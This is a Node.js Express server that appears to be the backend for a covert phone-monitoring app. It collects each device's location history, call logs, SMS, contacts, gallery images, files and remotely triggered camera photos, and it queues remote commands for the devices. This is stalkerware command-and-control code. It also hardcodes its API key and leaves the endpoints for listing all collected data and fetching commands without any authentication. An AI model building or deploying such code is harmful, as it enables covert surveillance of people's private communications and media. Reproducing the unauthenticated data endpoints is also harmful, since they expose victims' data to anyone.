const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;
const API_KEY = 'monitor-family-secret-7860';
const DATA_FILE = path.join(__dirname, 'devices.json');
const COMMANDS_FILE = path.join(__dirname, 'commands.json');

app.use(express.json({ limit: '50mb' }));
app.use(cors());

function getJSON(file) {
    try { return fs.existsSync(file) ? JSON.parse(fs.readFileSync(file, 'utf8')) : {}; } 
    catch (e) { return {}; }
}
function saveJSON(file, data) { fs.writeFileSync(file, JSON.stringify(data, null, 2)); }

// 1. Sync Data (Battery, Location, Calls)
app.post('/api/sync', (req, res) => {
    if (req.headers['x-api-key'] !== API_KEY) return res.status(401).json({ error: 'Invalid' });
    const { deviceId, deviceName, battery, location, callLogs } = req.body;
    const devices = getJSON(DATA_FILE);
    if (!devices[deviceId]) devices[deviceId] = { name: deviceName, battery: {}, locations: [], callLogs: [], sms: [], contacts: [], gallery: [], files: [] };
    if (battery) devices[deviceId].battery = battery;
    if (location) devices[deviceId].locations.push({ ...location, time: Date.now() });
    if (callLogs && callLogs.length > 0) devices[deviceId].callLogs = callLogs;
    devices[deviceId].lastSync = Date.now();
    saveJSON(DATA_FILE, devices);
    res.json({ ok: true });
});

// 2. Get All Devices
app.get('/api/devices', (req, res) => res.json(getJSON(DATA_FILE)));

// 3. Send Command
app.post('/api/command', (req, res) => {
    if (req.headers['x-api-key'] !== API_KEY) return res.status(401).json({ error: 'Invalid' });
    const { deviceId, command, params } = req.body;
    const commands = getJSON(COMMANDS_FILE);
    if (!commands[deviceId]) commands[deviceId] = [];
    commands[deviceId].push({ command, params, timestamp: Date.now(), executed: false });
    saveJSON(COMMANDS_FILE, commands);
    res.json({ success: true });
});

// 4. Get Commands
app.get('/api/commands/:deviceId', (req, res) => {
    const commands = getJSON(COMMANDS_FILE);
    const list = commands[req.params.deviceId] || [];
    res.json({ commands: list.filter(c => !c.executed) });
});

// 5. Mark Executed
app.post('/api/command/execute/:deviceId', (req, res) => {
    const { command } = req.body;
    const commands = getJSON(COMMANDS_FILE);
    const list = commands[req.params.deviceId] || [];
    const idx = list.findIndex(c => c.command === command && !c.executed);
    if (idx !== -1) { list[idx].executed = true; list[idx].executedAt = Date.now(); saveJSON(COMMANDS_FILE, commands); }
    res.json({ ok: true });
});

// 6. Receive SMS
app.post('/api/sms', (req, res) => {
    if (req.headers['x-api-key'] !== API_KEY) return res.status(401).json({ error: 'Invalid' });
    const { deviceId, sms } = req.body;
    const devices = getJSON(DATA_FILE);
    if (devices[deviceId]) { devices[deviceId].sms = sms || []; saveJSON(DATA_FILE, devices); }
    res.json({ ok: true });
});

// 7. Receive Contacts
app.post('/api/contacts', (req, res) => {
    if (req.headers['x-api-key'] !== API_KEY) return res.status(401).json({ error: 'Invalid' });
    const { deviceId, contacts } = req.body;
    const devices = getJSON(DATA_FILE);
    if (devices[deviceId]) { devices[deviceId].contacts = contacts || []; saveJSON(DATA_FILE, devices); }
    res.json({ ok: true });
});

// 8. Receive Gallery
app.post('/api/gallery', (req, res) => {
    if (req.headers['x-api-key'] !== API_KEY) return res.status(401).json({ error: 'Invalid' });
    const { deviceId, images } = req.body;
    const devices = getJSON(DATA_FILE);
    if (devices[deviceId]) { devices[deviceId].gallery = images || []; saveJSON(DATA_FILE, devices); }
    res.json({ ok: true });
});

// 9. Receive Files
app.post('/api/files', (req, res) => {
    if (req.headers['x-api-key'] !== API_KEY) return res.status(401).json({ error: 'Invalid' });
    const { deviceId, files } = req.body;
    const devices = getJSON(DATA_FILE);
    if (devices[deviceId]) { devices[deviceId].files = files || []; saveJSON(DATA_FILE, devices); }
    res.json({ ok: true });
});

// 10. Receive Photo
app.post('/api/camera', (req, res) => {
    if (req.headers['x-api-key'] !== API_KEY) return res.status(401).json({ error: 'Invalid' });
    const { deviceId, photoBase64, isFront } = req.body;
    const devices = getJSON(DATA_FILE);
    if (devices[deviceId]) {
        if (!devices[deviceId].gallery) devices[deviceId].gallery = [];
        devices[deviceId].gallery.push({ base64: photoBase64, timestamp: Date.now(), isFront });
        saveJSON(DATA_FILE, devices);
    }
    res.json({ ok: true });
});

app.get('/', (req, res) => res.send('✅ Backend Running!'));
app.listen(PORT, () => console.log(` Server on ${PORT}`));
